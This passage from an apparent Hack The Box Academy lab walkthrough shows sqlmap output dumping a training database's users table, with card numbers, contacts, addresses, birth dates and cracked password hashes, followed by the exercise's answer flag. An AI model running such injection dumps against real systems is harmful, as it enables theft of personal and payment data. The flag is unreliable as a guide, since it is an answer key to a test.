| 27 | 5134210174158363 | FrancisMArroyo@yahoo.com    | 951-252-9692 | Francis Arroyo    | 3600 Hillcrest Lane    | July 6 1993       | f2d897eb3bae0f1fd396325deb3c4779ae1d586d (ford1900)         | Gastroenterology nurse                            |
| 28 | 4485114901308234 | AngelJMarquez@gmail.com     | 209-874-4743 | Angel Marquez     | 1144 Richards Avenue   | May 14 1966       | 4bf1926f7bb7ae283e1390236fd4a8737209862e (rohaniah)         | Echocardiographer                                 |
| 29 | 4532210842993911 | PamelaJRock@yahoo.com       | 715-454-8565 | Pamela Rock       | 3110 Abner Road        | October 31 1992   | c7fbcdaf308cdcd64504d46342e7c79959388c44 (exquisite)        | Private investigator                              |
| 30 | 4556109704569770 | DennisDSnow@yahoo.com       | 715-730-1951 | Dennis Snow       | 4211 Tea Berry Lane    | November 10 1938  | 6725c7bee76ccdb7eda15fa263908988115498a9 (aza221p)          | Unlicensed assistive personnel                    |
| 31 | 5554945940459873 | LorenSBunch@gmail.com       | 805-766-2963 | Loren Bunch       | 3111 Par Drive         | October 22 1971   | 70f361f8a1c9035a1d972a209ec5e8b726d1055e (05adrian)         | Cafeteria cook                                    |
| 32 | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | c6970ba1130b4bbca5be99f0ce00a706f256c818                    | General and operations manager                    |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+

[09:15:43] [INFO] table 'testdb.users' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/users.csv'
[09:15:43] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[09:15:43] [WARNING] your sqlmap version is outdated

[*] ending @ 09:15:43 /2026-09-09/
```

**Answer:** `Enizoom1609`

---


[Back to Module Index](./README.md)
